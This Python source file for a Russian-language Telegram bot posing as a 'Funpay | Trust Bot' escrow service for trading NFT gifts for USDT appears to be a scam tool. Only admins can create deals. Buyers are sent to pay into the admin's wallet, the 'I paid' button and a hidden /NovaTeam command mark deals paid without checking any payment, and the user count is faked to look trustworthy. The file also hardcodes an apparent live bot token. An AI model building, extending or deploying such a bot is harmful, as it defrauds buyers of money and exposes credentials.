import asyncio
import logging
import random
import string
import re
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, CommandObject, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram import F
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web

# ========= ТВОИ ДАННЫЕ =========
BOT_TOKEN = "8856311536:AAG2kdQsB6_cSVVecDta8KdoGioMWFd0CB0"  # Твой токен
ADMIN_IDS = [8625870625]  # Твой ID
PORT = 8080

# ========= ХРАНИЛИЩЕ =========
deals = {}
user_current_deal = {}
user_count = 111968

# ========= FSM (Машина состояний) =========
class DealCreation(StatesGroup):
    waiting_amount = State()
    waiting_wallet = State()
    waiting_gift = State()
    waiting_confirm = State()

# ========= Вспомогательные функции =========
def generate_deal_id():
    suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"deal_{suffix}"

def format_number(num):
    return f"{num:,}".replace(',', ',')

# ========= ИНИЦИАЛИЗАЦИЯ =========
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

# ========= ВЕБ-СЕРВЕР (для UptimeRobot) =========
async def handle_ping(request):
    return web.Response(text="welcome to uptimerobot", status=200)

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host='0.0.0.0', port=PORT)
    await site.start()
    logging.info(f"Веб-сервер запущен на порту {PORT}")
    await asyncio.Event().wait()

# ========= КОМАНДА /START =========
@dp.message(Command("start"))
async def cmd_start(message: Message, command: CommandObject = None):
    global user_count
    args = command.args if command else None

    # Если пользователь перешёл по ссылке (типа deal_xxxxx)
    if args and args.startswith("deal_"):
        deal_id = args
        if deal_id in deals:
            deal = deals[deal_id]
            if deal['status'] == 'pending':
                deal['buyer_id'] = message.from_user.id
                user_current_deal[message.from_user.id] = deal_id

                gift_text = deal['gift_links'] if isinstance(deal['gift_links'], str) else "\n".join(deal['gift_links'])
                text = (
                    f"📌 Сделка #{deal_id}\n"
                    f"Тип: gift\n"
                    f"Описание: {gift_text}\n"
                    f"Сумма: {deal['amount']} USDT\n"
                    f"Реквизиты: `{deal['wallet']}`\n"
                    f"Статус: ожидаем покупателя.\n\n"
                    f"Переведите {deal['amount']} USDT, затем нажмите кнопку."
                )
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Я оплатил", callback_data=f"pay_{deal_id}")]
                ])
                await message.answer(text, reply_markup=kb, parse_mode="Markdown")
            else:
                await message.answer("❌ Сделка завершена.")
        else:
            await message.answer("❌ Сделка не найдена.")
        return

    # Обычный старт
    user_count += 1
    text = (
        f"Funpay | Trust Bot\n"
        f"{format_number(user_count)} пользователей\n\n"
        f"Добро пожаловать! Создайте сделку."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать сделку", callback_data="create_deal")]
    ])
    await message.answer(text, reply_markup=kb)

# ========= СОЗДАНИЕ СДЕЛКИ =========
@dp.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("⛔ Нет прав.", show_alert=True)
        return
    await state.set_state(DealCreation.waiting_amount)
    text = "Введите сумму сделки в USDT (целое число)."
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀ Назад", callback_data="back_to_menu")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@dp.message(DealCreation.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введите число.")
        return
    await state.update_data(amount=int(message.text))
    await state.set_state(DealCreation.waiting_wallet)
    text = "Введите адрес USDT-кошелька:"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀ Назад", callback_data="back_to_amount")]
    ])
    await message.answer(text, reply_markup=kb)

@dp.callback_query(F.data == "back_to_amount")
async def back_to_amount(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealCreation.waiting_amount)
    text = "Введите сумму сделки в USDT (целое число)."
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀ Назад", callback_data="back_to_menu")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@dp.message(DealCreation.waiting_wallet)
async def process_wallet(message: Message, state: FSMContext):
    wallet = message.text.strip()
    if len(wallet) < 10:
        await message.answer("❌ Слишком короткий адрес.")
        return
    await state.update_data(wallet=wallet)
    await state.set_state(DealCreation.waiting_gift)
    text = "Отправьте ссылку на NFT Gift (https://t.me/nft/...):"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀ Назад", callback_data="back_to_wallet")]
    ])
    await message.answer(text, reply_markup=kb)

@dp.callback_query(F.data == "back_to_wallet")
async def back_to_wallet(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealCreation.waiting_wallet)
    text = "Введите адрес USDT-кошелька:"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀ Назад", callback_data="back_to_amount")]
    ])
    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer()

@dp.message(DealCreation.waiting_gift)
async def process_gift(message: Message, state: FSMContext):
    links = [line.strip() for line in message.text.split('\n') if line.strip()]
    if not all(link.startswith("https://t.me/nft/") for link in links):
        await message.answer("❌ Ссылка должна начинаться с https://t.me/nft/")
        return
    await state.update_data(gift_links=links)
    data = await state.get_data()
    gift_display = "\n".join(links)
    text = (
        f"Проверьте данные:\n"
        f"Сумма: {data['amount']} USDT\n"
        f"Кошелёк: {data['wallet']}\n"
        f"Ссылка(и):\n{gift_display}\n\n"
        f"Подтвердить?"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да, создать", callback_data="confirm_deal")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_deal")]
    ])
    await state.set_state(DealCreation.waiting_confirm)
    await message.answer(text, reply_markup=kb)

@dp.callback_query(F.data == "confirm_deal", StateFilter(DealCreation.waiting_confirm))
async def confirm_deal(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    deal_id = generate_deal_id()
    deals[deal_id] = {
        'seller_id': callback.from_user.id,
        'amount': data['amount'],
        'wallet': data['wallet'],
        'gift_links': data['gift_links'],
        'status': 'pending',
        'buyer_id': None
    }
    await state.clear()
    bot_username = (await bot.get_me()).username
    link = f"https://t.me/{bot_username}?start={deal_id}"
    gift_display = "\n".join(data['gift_links'])
    text = (
        f"Сделка #{deal_id} создана!\n"
        f"Сумма: {data['amount']} USDT\n"
        f"Ссылка для покупателя:\n{link}"
    )
    await callback.message.edit_text(text)
    await callback.answer()

@dp.callback_query(F.data == "cancel_deal", StateFilter(DealCreation.waiting_confirm))
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text("❌ Отменено.")
    await callback.answer()

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await cmd_start(callback.message, command=None)
    await callback.answer()

# ========= КНОПКА "Я ОПЛАТИЛ" =========
@dp.callback_query(F.data.startswith("pay_"))
async def process_pay(callback: CallbackQuery):
    deal_id = callback.data.split("_")[1]
    deal = deals.get(deal_id)
    if not deal or deal['status'] != 'pending' or deal.get('buyer_id') != callback.from_user.id:
        await callback.answer("❌ Ошибка.", show_alert=True)
        return

    deal['status'] = 'paid'
    await callback.message.edit_text(f"✅ Оплата получена! Сделка #{deal_id} завершена.")
    seller_id = deal['seller_id']
    gift_display = "\n".join(deal['gift_links']) if isinstance(deal['gift_links'], list) else deal['gift_links']
    await bot.send_message(seller_id, f"🎉 Продавай! Ссылка: {gift_display}")
    await callback.answer("✅ Ок.")

# ========= СЕКРЕТНАЯ КОМАНДА =========
@dp.message(Command("NovaTeam"))
async def cmd_novateam(message: Message):
    user_id = message.from_user.id
    deal_id = user_current_deal.get(user_id)
    if not deal_id or deal_id not in deals:
        await message.answer("❌ Нет активной сделки.")
        return
    deal = deals[deal_id]
    if deal['status'] != 'pending' or deal.get('buyer_id') != user_id:
        await message.answer("❌ Ошибка.")
        return

    deal['status'] = 'paid'
    await message.answer(f"✅ Оплата получена! Сделка #{deal_id} завершена.")
    seller_id = deal['seller_id']
    gift_display = "\n".join(deal['gift_links']) if isinstance(deal['gift_links'], list) else deal['gift_links']
    await bot.send_message(seller_id, f"🎉 Продавай! (NovaTeam) Ссылка: {gift_display}")
    del user_current_deal[user_id]

# ========= ЗАПУСК =========
async def main():
    logging.basicConfig(level=logging.INFO)
    while True:
        try:
            await asyncio.gather(dp.start_polling(bot), web_server())
        except Exception as e:
            logging.error(f"Бот упал: {e}. Перезапуск через 10 сек...")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
